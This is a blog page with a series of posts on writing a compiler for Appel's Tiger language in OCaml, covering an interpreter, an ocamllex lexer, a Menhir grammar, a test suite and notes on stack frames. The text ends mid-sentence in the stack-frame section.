<!DOCTYPE html>
<html lang="en">

<head>
  <title>
   · vyorkin.org
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="Vasiliy Yorkin">
<meta name="description" content="
  Making of Tiger @compilerscompilerstigerocaml
  
    
    Link to heading
  


  DONE Making of Tiger #1, Intro
  
    
    Link to heading
  

Recently I&rsquo;ve started reading the book by
Andrew W. Appel
titled
Modern
compiler implementation in ML. I&rsquo;ve picked it up because I&rsquo;ve
heard some really good reviews about the ML version of it. Also
there are other editions available that use C and Java. Each
chapter covers a single phase of the compilation process and
comes with some initial ML code and programming excercies. At
the end you will have a working optimizing compiler.
I&rsquo;m building a compiler for the first time and it is a
lot of fun. In these blog post series, I&rsquo;ll be working through
the book and explaining my solutions to each chapter.

  Getting started
  
    
    Link to heading
  

The author describes Tiger as a simple (but nontrivial) language
of the Algol family, which could be easily modified to be
functional or object-oriented (maybe I&rsquo;ll skip the OO-part of
the book).

Here is an example program in Tiger

type tree = {
  key: string,
  left: tree,
  right: tree
}

function prettyprint(tree: tree) : string =
  let
    var output := &#34;&#34;

    function write(s: string) =
      output := concat(output, s)

    function show(n: int, t: tree) =
      let
        function indent(s: string) = (
          for i := 1 to n do
             write(&#34; &#34;);
             output := concat(output, s);
             write(&#34;\n&#34;)
        )
      in
        if t = nil
        then ident(&#34;.&#34;)
        else (
          indent(t.key);
          show(n &#43; 1, t.left);
          show(n &#43; 1, t.right)
        )
      end
  in
    show(0, tree);
    output
  end


For my implementation I&rsquo;ve decided to use OCaml. It is
close
enough to SML so with even basic ML experience it should be
fairly straightforward to port the code examples.



Straight-line programs
The first &ldquo;warm-up&rdquo; assignment is to implement a program
analyzer and interpreter for the straight-line programming
language. We have the following types:
type id = string

type binop = Plus | Minus | Times | Div

type stm = Compound of stm * stm
         | Assign of id * exp
         | Print of exp list

 and exp = Id of id
         | Num of int
         | Op of exp * binop * exp
         | Eseq of stm * exp
So for the following sample straight-line program
a := 5 &#43; 3;
b := (print(a, a - 1), a * 10);
print(b)
The corresponding AST would be
Compound(
  Assign(&#34;a&#34;, Op(Num 5, Plus, Num 3)),
  Compound(
    Assign(&#34;b&#34;,
      Eseq(
        Print [Id &#34;a&#34;; Op(Id &#34;a&#34;, Minus, Num 1)],
        Op(Num 10, Times, Id &#34;a&#34;))),
    Print [Id &#34;b&#34;]))
The first task is to write a function
val maxargs : stm -&gt; int
This function tells the maximum number of args of any print
statement within any subexpression of a given statement.
Sounds easy, right? The implementation is pretty straightforward
too:
open Base
open Straightline

let rec maxargs stm =
  let maxargs_exp = function
    | Eseq (stm, _) -&gt; maxargs stm
    | _ -&gt; 0
  in match stm with
  | Print exps -&gt;
    let len = List.length exps in
    let exp_lens = List.map ~f:maxargs_exp exps in
    let max_exp_len = List.max_elt ~compare:Int.compare exp_lens in
    Int.max len (Option.value ~default:0 max_exp_len)
  | Compound (exp1, exp2) -&gt;
    let l1 = maxargs exp1 in
    let l2 = maxargs exp2 in
    Int.max l1 l2
  | Assign (_, exp) -&gt;
    maxargs_exp exp
Next, we need to write another function that &ldquo;interprets&rdquo;
program in this language.
val eval : stm -&gt; unit
A simple interpreter could look like this:
open Base
open Stdio
open Straightline

let eval x op y =
  match op with
  | Plus  -&gt; x &#43; y
  | Minus -&gt; x - y
  | Times -&gt; x * y
  | Div   -&gt; x / y

let rec interp_stm stm env =
  let print env0 exp =
    let (v, env1) = interp_exp exp env0 in
    print_endline (Int.to_string v);
    env1
  in
  match stm with
  | Print exps -&gt;
    List.fold_left ~init:env ~f:print exps
  | Assign (key, exp) -&gt;
    let (data, env1) = interp_exp exp env in
    Map.set env1 ~key ~data
  | Compound (stm1, stm2) -&gt;
    let env1 = interp_stm stm1 env in
    interp_stm stm2 env1

and interp_exp exp env =
  match exp with
  | Id k -&gt;
    let v = Map.find_exn env k in (v, env)
  | Num x -&gt; (x, env)
  | Op (exp1, op, exp2) -&gt;
    let (x, env1) = interp_exp exp1 env in
    let (y, env2) = interp_exp exp2 env1 in
    let r = eval x op y in
    (r, env2)
  | Eseq (stm, exp) -&gt;
    let env1 = interp_stm stm env in
    interp_exp exp env1
Here we&rsquo;re just recursively traversing a tree, keeping a map of
identifiers, evaluating arithmetic operations and printing
values.



  Excersises
  
    
    Link to heading
  

A couple of more excercises about trees, nothing super exciting.
So I won&rsquo;t paste the rest of my solutions here. To implement a
balanced-tree (ex. d) I&rsquo;ve read the chapter about Red-Black
Trees in
Okasaki
book. The code is
here.
Well, thats all for part 1! The next one is about lexical
analysis where we&rsquo;ll write a simple lexer for the Tiger
language.

  Conclusion
  
    
    Link to heading
  

By the time I&rsquo;ve decided to start writing this post I&rsquo;ve already
finished reading 6th chapter and here are some first impressions:

The book is clear and enjoyable to read. Programming
assignments and exercises are well thought out
Implementing the typechecker (chapter 5) wasn&rsquo;t easy, for me
it took a week to make it work and typecheck correctly every
given example program
Chapter 6 feels easier (less code to write), but requires some
basic knowledge about microprocessor architectures (SPARK,
MIPS)

I wouldn&rsquo;t recommend starting with this book to someone with
zero compiler design knowledge. But it is definitely a must read
for people who already know the basics of compiler construction.

  DONE Making of Tiger #2, Lexical Analysis lexingocamllex
  
    
    Link to heading
  


  Intro
  
    
    Link to heading
  

We need a way to translate a program written in one
(human-friendly) language to another (machine-specific)
language. Generally, this work is splitted into 2 parts:
analysis and synthesis.
The synthesis-part (back end) is responsible for the code
generation and optimizations.
Analysis-part (front end) is responsible for breaking the
program apart to understand its structure and meaning. There are
3 commonly used analysis phases:

Lexical – breaking a sequence of characters into sequence
of individual tokens (words)
Syntax – parsing and checking that we have a valid sequence
of tokens
Semantic – gathering the program’s meaning, making sure
that declarations and statements of program are semantically
correct, this usually includes type checking

In this post we’ll focus on implementing the lexical analysis
phase.
A lexical token is a string with an assigned and identified
meaning. This is a unit in a grammar of a programming
language.

Example tokens: identifiers, keywords, separators, operators
Example non-tokens: white-spaces, tabs, newlines, comments,
preprocessor directives, macroses

Now, I’m going to skip everything related to finite automata and
regular expressions and go straight to the implementation of
lexer (lexical analyzer). You can find a good intro to lexing
and parsing using ocamllex and menhir in the Read World
OCaml book.

  Example lexer (morse code)
  
    
    Link to heading
  

We’ll start with the simplest possible example of building a
lexer for morse code, the full source code is here.
The dune file for our playground project is going to look like
this:
(ocamllex
 (modules lexer))

(executable
 (name driver)
 (libraries core stdio)
 (preprocess (pps ppx_deriving.show)))

(env (dev (flags (:standard -warn-error -A))))
Nothing fancy here. Next one is the driver.ml module, this is
our entry point. It simply reads the given file, runs our lexer
and displays the resulting S-expression.
open Core
open Syntax

let rec tokens buf =
  match Lexer.read buf with
  | EOF -&gt; [EOF]
  | tok -&gt; tok::tokens buf

let lex_print ch =
  ch
  |&gt; Lexing.from_channel
  |&gt; tokens
  |&gt; List.iter ~f:(fun e -&gt; Format.printf &#34;%s\n&#34; (show_exp e))

let run filename () =
  In_channel.with_file filename ~f:lex_print

let () =
  let spec = Command.Spec.(empty &#43;&gt; anon (&#34;filename&#34; %: string)) in
  run
  |&gt; Command.basic_spec ~summary:&#34;Run the lexer and display tokens&#34; spec
  |&gt; Command.run
We need a module to describe our tokens, lets call it
syntax.ml:
type exp =
  | SYM of string (* symbol *)
  | SEP (* separator *)
  | EOF (* end of file *)
  [@@deriving show]
And the lexer generator itself:
{
  open Lexing
  open Syntax

  (* Custom exception type for lexer errors *)
  exception SyntaxError of string
}

(* Regular expressions: *)

(* We use whitespace as a separator, so
   it is a valid token in our language *)
let white   = [&#39; &#39; &#39;\t&#39;]&#43;
let newline = &#39;\r&#39; | &#39;\n&#39; | &#34;\r\n&#34;
let sym     = [&#39;.&#39; &#39;-&#39;]&#43;

(* Lexing rules: *)

rule read = parse
  (* New lines are separators too *)
  | newline { new_line lexbuf; SEP }
  | sym     { SYM (lexeme lexbuf) }
  | white   { SEP }
  | _       { raise (SyntaxError (Printf.sprintf &#34;At offset %d: unexpected character.\n&#34; (lexeme_start lexbuf))) }
  | eof     { EOF }
Now we can parse the “hello world” sequence written in Morse
Code:
.... . .-.. .-.. ---
.-- --- .-. .-.. -..
The output will be:
(SYM &#34;....&#34;) SEP (SYM &#34;.&#34;) SEP (SYM &#34;.-..&#34;) SEP (SYM &#34;.-..&#34;) SEP (SYM &#34;---&#34;)
SEP
(SYM &#34;.--&#34;) SEP (SYM &#34;---&#34;) SEP (SYM &#34;.-.&#34;) SEP (SYM &#34;.-..&#34;) SEP (SYM &#34;-..&#34;)
EOF

  Tiger lexer
  
    
    Link to heading
  

Having that basic understanding of how to use the ocamllex to
build lexers, we can try to build one for our Tiger language.
The dune file is going to remain the same as in the “morse
code” example above. There is a Tiger Language Reference Manual
in Appendix A of the book where you can find the information
about the tokens we need: identifiers, comments, declarations,
data types, etc.
For now, we don’t need to define a real AST data type.

The “mock” syntax.ml module would suffice.

type exp =
    | TYPE
    | VAR
    | FUNCTION
    | BREAK
    | OF
    | END
    | IN
    | NIL
    | LET
    | DO
    | TO
    | FOR
    | WHILE
    | ELSE
    | THEN
    | IF
    | ARRAY
    | ASSIGN
    | OR
    | AND
    | GE
    | GT
    | LE
    | LT
    | NEQ
    | EQ
    | DIVIDE
    | TIMES
    | MINUS
    | PLUS
    | DOT
    | RBRACE
    | LBRACE
    | RBRACK
    | LBRACK
    | RPAREN
    | LPAREN
    | SEMICOLON
    | COLON
    | COMMA
    | STRING of string
    | INT of int
    | ID of string
    | EOF
    [@@deriving show]


We want to focus on the lexer part. First, we might want to open
some commonly used modules and define a custom exception type
for lexing errors.
{
open Lexing
open Syntax
open Base

exception SyntaxError of string
}
Next, we need a few regular expressions:

let digit = [&#39;0&#39;-&#39;9&#39;]
(* There are no negative integer literals in Tiger *)
let int = digit&#43;
let frac = &#39;.&#39; digit*
let exp = [&#39;e&#39; &#39;E&#39;] [&#39;-&#39; &#39;&#43;&#39;]? int
let float = digit* frac? exp?
let white = [&#39; &#39; &#39;\t&#39;]&#43;
let newline = &#39;\r&#39; | &#39;\n&#39; | &#34;\r\n&#34;
According to Appendix A:
An identifier is a sequence of letters, digits and underscores, starting with a letter. Uppercase letters are distinguished from lowercase.
let alphanum = [&#39;a&#39;-&#39;z&#39; &#39;A&#39;-&#39;Z&#39; &#39;0&#39;-&#39;9&#39; &#39;_&#39;]
let id = [&#39;a&#39;-&#39;z&#39;] alphanum*
Lexing rules.
rule read = parse
  (* Whitespaces *)
  | white { read lexbuf }
We want to skip the new lines.
  | newline { new_line lexbuf; read lexbuf }
We have a separate function to read strings (see the
implementation below).
  | &#39;&#34;&#39; { read_string (Buffer.create 16) lexbuf }
Again, according the Appendix A:
A comment may appear between any two tokens. Comments start with /* and end with */ and may be nested.
We’ll have a separate function for reading comments (scroll down
to see its code).
  | &#34;/*&#34; { read_comment [lexbuf.lex_curr_p] lexbuf }
Basic keywords:
  | &#34;type&#34;     { TYPE }
  | &#34;var&#34;      { VAR }
  | &#34;function&#34; { FUNCTION }
  | &#34;break&#34;    { BREAK }
  | &#34;of&#34;       { OF }
  | &#34;end&#34;      { END }
  | &#34;in&#34;       { IN }
  | &#34;nil&#34;      { NIL }
  | &#34;let&#34;      { LET }
  | &#34;array&#34;    { ARRAY }
We need 4 tokens for loops:
  | &#34;do&#34;    { DO }
  | &#34;to&#34;    { TO }
  | &#34;for&#34;   { FOR }
  | &#34;while&#34; { WHILE }
Conditionals (if-then-else):
  | &#34;else&#34; { ELSE }
  | &#34;then&#34; { THEN }
  | &#34;if&#34;   { IF }
Operators:
  (* General *)
  | &#34;:=&#34; { ASSIGN }

  (* Logical *)
  | &#34;|&#34; { OR }
  | &#34;&amp;&#34; { AND }

  (* Comparison *)
  | &#34;&gt;=&#34; { GE }
  | &#34;&gt;&#34;  { GT }
  | &#34;&lt;=&#34; { LE }
  | &#34;&lt;&#34;  { LT }
  | &#34;&lt;&gt;&#34; { NEQ }
  | &#34;=&#34;  { EQ }

  (* Arithmetics *)
  | &#34;/&#34; { DIVIDE }
  | &#34;*&#34; { TIMES }
  | &#34;-&#34; { MINUS }
  | &#34;&#43;&#34; { PLUS }
Separators:
  | &#34;.&#34; { DOT }
  | &#34;{&#34; { LBRACE }
  | &#34;}&#34; { RBRACE }
  | &#34;[&#34; { LBRACK }
  | &#34;]&#34; { RBRACK }
  | &#34;(&#34; { LPAREN }
  | &#34;)&#34; { RPAREN }
  | &#34;;&#34; { SEMICOLON }
  | &#34;:&#34; { COLON }
  | &#34;,&#34; { COMMA }
Numbers, identifiers, error and EOF handling:
  | int { INT (Int.of_string (Lexing.lexeme lexbuf)) }
  | id  { ID (Lexing.lexeme lexbuf) }
  | _   { raise (SyntaxError (&#34;Unexpected character: &#34; ^ Lexing.lexeme lexbuf)) }
  | eof { EOF }
The rule to match string literals:
and read_string buf = parse
  (* If we reach the terminating double quote, then
   * we return the contents of the buffer as a STRING. *)
  | &#39;&#34;&#39;       { STRING (Buffer.contents buf) }
  (* Handling escape sequences *)
  | &#39;\\&#39; &#39;\\&#39; { Buffer.add_char buf &#39;\\&#39;; read_string buf lexbuf }
  | &#39;\\&#39; &#39;/&#39;  { Buffer.add_char buf &#39;/&#39;;  read_string buf lexbuf }
  | &#39;\\&#39; &#39;b&#39;  { Buffer.add_char buf &#39;\b&#39;; read_string buf lexbuf }
  | &#39;\\&#39; &#39;f&#39;  { Buffer.add_char buf &#39;\012&#39;; read_string buf lexbuf }
  | &#39;\\&#39; &#39;n&#39;  { Buffer.add_char buf &#39;\n&#39;; read_string buf lexbuf }
  | &#39;\\&#39; &#39;r&#39;  { Buffer.add_char buf &#39;\r&#39;; read_string buf lexbuf }
  | &#39;\\&#39; &#39;t&#39;  { Buffer.add_char buf &#39;\t&#39;; read_string buf lexbuf }
  | [^ &#39;&#34;&#39; &#39;\\&#39;]&#43;
    { Buffer.add_string buf (Lexing.lexeme lexbuf);
      read_string buf lexbuf
    }
  | _   { raise (SyntaxError (&#34;Illegal string character: &#34; ^ Lexing.lexeme lexbuf)) }
  | eof { raise (SyntaxError &#34;String is not terminated&#34;) }
The rule to match comments (including nested comments), keeping
a list of where comments open:
and read_comment opened = parse
  (* Opening comment *)
  | &#34;/*&#34; { read_comment (lexbuf.lex_curr_p::opened) lexbuf }
  (* Closing comment *)
  | &#34;*/&#34;
    { match opened with
      (* No nested opened comments left, continue parsing. *)
      | _::[] -&gt; read lexbuf
      (* Continue parsing comment. *)
      | _ -&gt; read_comment (List.tl_exn opened) lexbuf
    }
  | newline { new_line lexbuf; read_comment opened lexbuf }
  | _ { read_comment opened lexbuf }
  (* Unexpected end-of-file. Update the current location to
   * point to the opening token that wasn&#39;t closed and raise an error. *)
  | eof
    { lexbuf.lex_curr_p &lt;- List.hd_exn opened;
      raise (SyntaxError &#34;Unterminated comment&#34;)
    }

  Summary
  
    
    Link to heading
  

We’ve learned some new things, like ocamllex, but overall, it
wasn’t too hard to follow the book. The full OCaml source code
for the second chapter can be found here. In the next part we’re
going to write a parser.

  DONE Making of Tiger #3, Parsing parsingmenhir
  
    
    Link to heading
  


  Intro
  
    
    Link to heading
  

In this chapter we’re going to build a parser for our Tiger
language. First, let’s do a quick recap of some important
concepts of the theory behind programming language parsers:

Parser generator is the most common type of
compiler-compiler’s. It takes some formal grammar (typically
it is a context-free grammar in BNF or EBNF form), that
defines a syntax of a programming language.


  Tiger grammar with Menhir
  
    
    Link to heading
  

While reading the current paragraph I highly recommend
consulting the Tiger Language Reference Manual that has a
precise description (along with a BNF notation) of everything
we’re going to define below.
Menhir is an LR(1) parser generator library for OCaml. It
integrates with Dune quiet nicely. All we need to do is to add
the menhir stanza to our dune file (the one from the
previous chapter). So the whole file will look like this:
(menhir
 (modules parser)
 (flags (&#34;--dump&#34; &#34;--explain&#34;)))

(ocamllex
 (modules lexer))

(library
 (name ch3)
 (inline_tests)
 (libraries core stdio)
 (preprocess (pps ppx_inline_test ppx_expect)))

(env (dev (flags (:standard -warn-error -A))))
Notice the --dump and --explain switches:

The --dump switch means to write a description of the
automaton to the .automaton file.
The --explain switch helps us to understand severe conflicts in
terms of a grammar (rather than in terms of automaton),
enabling it means to write a textual explanation of detected
shift-reduce conflicts to the .conflicts file. Here is
the example of how it looks.

See the conflicts part of the Menhir manual for details.
We’ll use the
new
syntax for rules (despite the fact that it is considered
experimental). First, let’s define some
token
aliases, priorities and associativity levels. Basically these
are the same tokens we used in our lexer.
Base keywords:
%token TYPE     &#34;type&#34;
%token VAR      &#34;var&#34;
%token FUNCTION &#34;function&#34;
%token BREAK    &#34;break&#34;
%token OF       &#34;of&#34;
%token END      &#34;end&#34;
%token IN       &#34;in&#34;
%token NIL      &#34;nil&#34; (* nil denotes a value belonging to every record type *)
%token LET      &#34;let&#34;
%token ARRAY    &#34;array&#34;
Loop-related keywords:
%token DO    &#34;do&#34;
%token TO    &#34;to&#34;
%token FOR   &#34;for&#34;
%token WHILE &#34;while&#34;
Keywords for conditional expression:
%token IF   &#34;if&#34;
%token THEN &#34;then&#34;
%token ELSE &#34;else&#34;
Operator tokens:
(* General *)
%token ASSIGN &#34;:=&#34;

(* Logical *)
%token OR  &#34;|&#34;
%token AND &#34;&amp;&#34;

(* Comparison *)
%token GE  &#34;&gt;=&#34;
%token GT  &#34;&gt;&#34;
%token LE  &#34;&lt;=&#34;
%token LT  &#34;&lt;&#34;
%token NEQ &#34;&lt;&gt;&#34;
%token EQ  &#34;=&#34;

(* Arithmetics *)
%token DIVIDE &#34;/&#34;
%token TIMES  &#34;*&#34;
%token PLUS   &#34;&#43;&#34;
%token MINUS  &#34;-&#34;
Tokens for separators:
%token DOT       &#34;.&#34;
%token LBRACE    &#34;{&#34;
%token RBRACE    &#34;}&#34;
%token LBRACK    &#34;[&#34;
%token RBRACK    &#34;]&#34;
%token LPAREN    &#34;(&#34;
%token RPAREN    &#34;)&#34;
%token SEMICOLON &#34;;&#34;
%token COLON     &#34;:&#34;
%token COMMA     &#34;,&#34;
Strings, numbers, identifiers and the EOF token:
%token &lt;string&gt; STRING &#34;string&#34;
%token &lt;int&gt;    INT    &#34;int&#34;
%token &lt;string&gt; ID     &#34;id&#34;

%token EOF
Associativity of operators:
%nonassoc &#34;of&#34;
%nonassoc &#34;then&#34;
%nonassoc &#34;else&#34;
%nonassoc &#34;do&#34;
%nonassoc &#34;:=&#34;
%left     &#34;|&#34;
%left     &#34;&amp;&#34;
%nonassoc &#34;&gt;=&#34; &#34;&gt;&#34; &#34;&lt;=&#34; &#34;&lt;&#34; &#34;&lt;&gt;&#34; &#34;=&#34;
%left     &#34;&#43;&#34; &#34;-&#34;
%left     &#34;*&#34; &#34;/&#34;
The grammar rules:
%start &lt;unit&gt; main

%%

let main :=
  ~ = expr; EOF; &lt;&gt;
Top-level expression:
let expr :=
  | primitive
  | &#34;nil&#34;
  | &#34;break&#34;
  | create_rec
  | create_arr
  | lvalue
  | assignment
  | local
  | conditional
  | loop
  | fun_call
  | unary
  | binary
  | seq
It might not be obvious from the expr definition, but it also
includes a thing called no value (an expression that yields no
value). So when looking at the top-level expression and
comparing it to the language reference manual, please note that
in our grammar no_val := &quot;(&quot; &quot;)&quot; (empty seq).
There are two built-in (predefined) primitive types: int and
string. The grammar rule for those is pretty straightforward:
let primitive :=
  | &#34;string&#34;; { () }
  | &#34;int&#34;; { () }
In our language we have only one unary operator – minus:
let unary := &#34;-&#34;; expr
But we have two kinds of binary operators: boolean and
“logical &#43; arithmetic”, which we’ll simply call bin:
let binary :=
  | bin
  | boolean
Scroll down to see the definitions of bin and boolean.
We have 2 kinds of loops: the while loop and the for loop:
let loop :=
  | while_loop
  | for_loop

let while_loop := &#34;while&#34;; expr; &#34;do&#34;; expr
let for_loop   := &#34;for&#34;; &#34;id&#34;; &#34;:=&#34;; expr; &#34;to&#34;; expr; &#34;do&#34;; expr
Nothing new or unusual. And the conditional expression rule is
also quite trivial:
let conditional :=
  | &#34;if&#34;; expr; &#34;then&#34;; expr; &#34;else&#34;; expr
  | &#34;if&#34;; expr; &#34;then&#34;; expr
Syntax for local bindings is going to be exactly like in OCaml
or SML:
let local := &#34;let&#34;; decs; &#34;in&#34;; expr_seq; &#34;end&#34;
Now, a slightly more complex part – declarations.
As stated in the Tiger language reference manual, a
declaration-sequence is a sequence of type, value, and
function declarations. No punctuation separates or terminates
individual declarations.
In terms of Menhir we can express it like this:
let decs := list(dec); { () }

let dec :=
  | ty_dec  (* type *)
  | var_dec (* value *)
  | fun_dec (* function declaration *)
Ok, we need to define a separate rule for each declaration
mentioned above.
To declare a data type in the Tiger language we start with the
keyword type, after which comes the identifier, the equality
token and the type declaration body:
let ty_dec := &#34;type&#34;; &#34;id&#34;; &#34;=&#34;; ty
The type declaration could be a record, an array or a type
alias (any identifier):
let ty :=
  | braced(ty_fields) (* records *)
  | &#34;array&#34;; &#34;of&#34;; &#34;id&#34;; { () } (* arrays *)
  | &#34;id&#34;; { () }

let ty_fields := separated_list(&#34;,&#34;, ty_field); { () }
let ty_field  := &#34;id&#34;; ty_ann
As per language reference manual, there are two possible ways to
declare a variable: with or without type annotation. The
following rule reflects this:
let var_dec :=
  | &#34;var&#34;; &#34;id&#34;;         &#34;:=&#34;; expr
  | &#34;var&#34;; &#34;id&#34;; ty_ann; &#34;:=&#34;; expr
The record and array creation rules below are also considered
top-level expressions:
let create_rec := &#34;id&#34;; braced(init_rec_fields)
let create_arr := &#34;id&#34;; bracketed(expr); &#34;of&#34;; expr

let init_rec_fields := separated_list(&#34;,&#34;, init_rec_field); { () }
let init_rec_field  := &#34;id&#34;; &#34;=&#34;; expr
Next, we need a function declaration rule:
let fun_dec :=
  (* procedures doesn&#39;t return values *)
  | fun_head; &#34;=&#34;; fun_body
  (* functions return values and the type is specified after the colon *)
  | fun_head; &#34;:&#34;; &#34;id&#34;; &#34;=&#34;; fun_body

let fun_head   := &#34;function&#34;; &#34;id&#34;; fun_params
let fun_body   := expr
let fun_params := parenthesized(ty_fields)
According to our language spec:
&gt; An l-value is a location, whose value may be read or assigned.
&gt; Variables, procedure parameters, fields or records, and
elements are all l-values.
let lvalue :=
  (* variable *)
  | &#34;id&#34;; { () }
  (* everything else *)
  | lvalue_t

let lvalue_t :=
  (* simple record field *)
  | &#34;id&#34;; &#34;.&#34;; &#34;id&#34;; { () }
  (* compound record field *)
  | lvalue_t; &#34;.&#34;; &#34;id&#34;; { () }
  (* simple array subscript *)
  | &#34;id&#34;; bracketed(expr)
  (* compund array subscript *)
  | lvalue_t; bracketed(expr)
Assignment of an expression to lvalue:
let assignment := lvalue; &#34;:=&#34;; expr
Sequence of expressions delimited by semicolon:
let expr_seq := separated_list(&#34;;&#34;, expr); { () }

let seq := parenthesized(expr_seq)
Function call rule:
let fun_call := &#34;id&#34;; parenthesized(fun_args)
let fun_args := separated_list(&#34;,&#34;, expr); { () }
Arithmetic, comparison and equality expressions:
let bin := expr; bin_op; expr
let bin_op == &#34;&#43;&#34; | &#34;-&#34; | &#34;*&#34; | &#34;/&#34; | &#34;&gt;=&#34; | &#34;&gt;&#34; | &#34;&lt;=&#34; | &#34;&lt;&#34; | &#34;&lt;&gt;&#34; | &#34;=&#34;
Boolean expressions:
let boolean := expr; boolean_op; expr
let boolean_op == &#34;&amp;&#34; | &#34;|&#34;
Helper rule for a type annotation which we used in the var_dec
and ty_field above:
let ty_ann := &#34;:&#34;; &#34;id&#34;
Menhir allows us to declare functions, so these are three helper
functions that we used everywhere else for delimited
expressions:
let parenthesized(x) == delimited(&#34;(&#34;, x, &#34;)&#34;)
let bracketed(x)     == delimited(&#34;[&#34;, x, &#34;]&#34;)
let braced(x)        == delimited(&#34;{&#34;, x, &#34;}&#34;)

  Test suite
  
    
    Link to heading
  

In order to iterate on our parser quickly we want to automate
the process of testing it against the provided example programs.
The most convenient way to do that would be to create a test
suite that we could run after every change we make.
Some of the provided example Tiger programs are intentionally
broken, so we want to skip those:
let skipped =
  [&#34;test16.tig&#34;; &#34;test17.tig&#34;; &#34;test19.tig&#34;;
   &#34;test20.tig&#34;; &#34;test25.tig&#34;;
   &#34;test45.tig&#34;; &#34;test49.tig&#34;]
A couple of helper functions to list the example programs
(recursively):
let is_tig_ext filename =
  let (_, ext) = Filename.split_extension filename in
  match ext with
  | Some &#34;tig&#34; -&gt; true
  | _ -&gt; false

let is_tig_file f =
  Sys.is_file_exn ~follow_symlinks:true f &amp;&amp;
  is_tig_ext f

let rec ls_rec dir =
  if is_tig_file dir
  then
    if not(List.mem skipped (Filename.basename dir) ~equal:(=)) then
      [dir]
    else
      []
  else
    dir
    |&gt; Sys.ls_dir
    |&gt; List.concat_map
      ~f:(fun sub -&gt; ls_rec (Filename.concat dir sub))
Let’s add another helper function to get current position along
with a filename as a string. We’ll need it later to output an
error location:
let position lexbuf =
  let pos = lexbuf.lex_curr_p in
  let col = pos.pos_cnum - pos.pos_bol &#43; 1 in
  Printf.sprintf &#34;%s:%d:%d&#34; pos.pos_fname pos.pos_lnum col
And another two functions to run the parser and print the error
details in case of failure:
let parse_with_error lexbuf =
  try
    Parser.main Lexer.read lexbuf;
    assert_bool &#34;Ok&#34; true
  with
  | SyntaxError msg -&gt;
    assert_failure (position lexbuf ^ &#34; : &#34; ^ msg)
  | Parser.Error -&gt;
    assert_failure (&#34;Syntax error: &#34; ^ position lexbuf)

let parse filename ch =
  let lexbuf = Lexing.from_channel ch in
  lexbuf.lex_curr_p &lt;- {
    lexbuf.lex_curr_p with pos_fname = Filename.basename filename
  };
  parse_with_error lexbuf
Here is the function that we’re going to call for each .tig
file:
let run_parser filename _ =
  In_channel.with_file filename ~f:(parse filename)
Finally, the test suite is going to look like this:
let suite =
  &#34;tiger programs&#34; &gt;:::
  let tests_dir = &#34;../../../book&#34; ^ Filename.dir_sep ^ &#34;testcases&#34; in
  let tests_path = Filename.(concat parent_dir_name tests_dir) in
  let tig_files = ls_rec tests_path in
  (List.map ~f:
     (fun filename -&gt;
        Filename.basename filename &gt;:: run_parser filename)
     tig_files)

let () =
  run_test_tt_main suite
The dune file for our test suite project will simply run the
testsuite.exe executable:
(executable
 (name testsuite)
 (libraries base core ch3 oUnit))

(alias
 (name runtest)
 (action (run ./testsuite.exe)))
Now it’ll be much easier to work on the parser implementation.
Also this test suite might be useful to detect possible
regressions if we want to change the parser in the future.

  Conclusion
  
    
    Link to heading
  

Of course, I didn’t come up with this grammar right away. I
spent almost a week implementing this parser. I started with a
simple parser for “straightline programs” and iterated on it
until it evolved to the fully functional Tiger-language grammar.
And it took some time for me to figure out how to resolve all
the shift-reduce conflicts.
Another cool feature of Menhir is its REPL, which might be
helpful for debugging. This is especially useful when you
already caught a parser error by running the test suite and now
you want to try constructing an invalid expression to check your
hypothesis. I used this kind of workflow a lot while working on
this grammar.
You can run the interpreter like this:
menhir --interpret --interpret-show-cst parser.mly
Now you can start typing expressions until you find something
that breaks your parser. Note that you can’t use token aliases
inside this REPL.
For example, here is how you can test a function declaration:
LET FUNCTION ID LPAREN ID COLON ID RPAREN COLON ID EQ IF ID EQ INT THEN INT ELSE INT TIMES ID LPAREN ID MINUS INT RPAREN IN ID LPAREN INT RPAREN END
That’s it for now. The full source code for this chapter
is
here. Next time we’re going to work on the AST for our Tiger
language.

  DRAFT Making of Tiger #4, Abstract Syntax ast
  
    
    Link to heading
  


  Intro
  
    
    Link to heading
  


  TODO Making of Tiger #5, Semantic Analysis type-checking
  
    
    Link to heading
  


  Intro
  
    
    Link to heading
  

I really enjoyed working through this chapter, but at the same
time implementing the type-checking phase was a bit more
difficult than working on AST, parser or lexer from the previous
chapters.

  DONE Making of Tiger #6, Stack frames stackmemory
  
    
    Link to heading
  


  Intro
  
    
    Link to heading
  

In this post we&rsquo;re going to add support for stack frames.
Here I&rsquo;ve made some notes while reading the chapter 6 to make sure I
understand things clearly.



Stack
A stack is a region of memory that grows downward and shrinks
upward (like icicles). The top of the stack is it&rsquo;s lowest
memory address. We treat stack as a big array, with a
special register &ndash; the stack pointer (SP).
The stack grows only at the entry to a function, by the
increment large enough to hold all the local variables for that
function. The stack shrinks at the exit from the function by
the same amount.





Stack frame (SF)
We need a stack frame abstraction because:

Local variables are pushed/popped in large batches on function
entry/exit
When local variables created they are not always initialized
right away
After many variables have been pushed, we want to continue
accessing variables deep within the stack

A stack frame consists of:

Some of local variables (others are kept in CPU registers)
Return address (where control should return after completion
of the current function)
Temporaries and saved registers
Outgoing/incoming arguments

Another name for a stack frame is a function activation
record. Stack frame layout depends on the ISA and the
programming language being compiled.
Here is a typical stack frame layout:
:    :             (higher addresses)
:    :             previous frame
| i1 | [FP&#43;8]      (2-nd argument)
| i2 | [FP&#43;4]      (1-st argument)
| SL | [FP]        (static link)
-------------------------------------------------
| l1 | [FP-4]      (1-st local variable)
| l2 | [FP-8]      (2-nd local variable)
:    :
| lk | [FP-k*4]    (k-nd local variable)
| RA | [FP-k*4-k]  (return address)
:    :
| t1 |             (1-st temp) temporaries and
| t2 |             (2-nd temp) saved registers
:    :
| o1 |             (1-st outgoing arg) outgoing
| o2 |             (2-nd outgoing arg) arguments
:    :
| SP | [FP-?]      (current stack pointer)
-------------------------------------------------
:    :             next frame
:    :             (lower addresses)





Stack pointer (SP)
Always points to the top of the stack (lowest memory address in
a stack).





Frame pointer (FP)
A term we use for convenience.
On entry to some function f we allocate a new stack frame (SF) by
subtracting the frame size from the SP and the old FP is saved
in the stack frame (SF).
Basically, if the frame size is fixed: FP = SP &#43; size(SF).
On function enter:

SF[0...k] = V[0...k] (put local variables in SF)
SF[k &#43; 1] = FP (save the current FP in SF)
FP = SP (old SP becomes the current FP)

On function exit:

SP = FP (copy FP back to SP)
FP = SF[k &#43; 1] (fetch back the saved FP)

The size of stack frame (SF) is not known until quite late in the compilation
process, but we want to know the offsets of function arguments
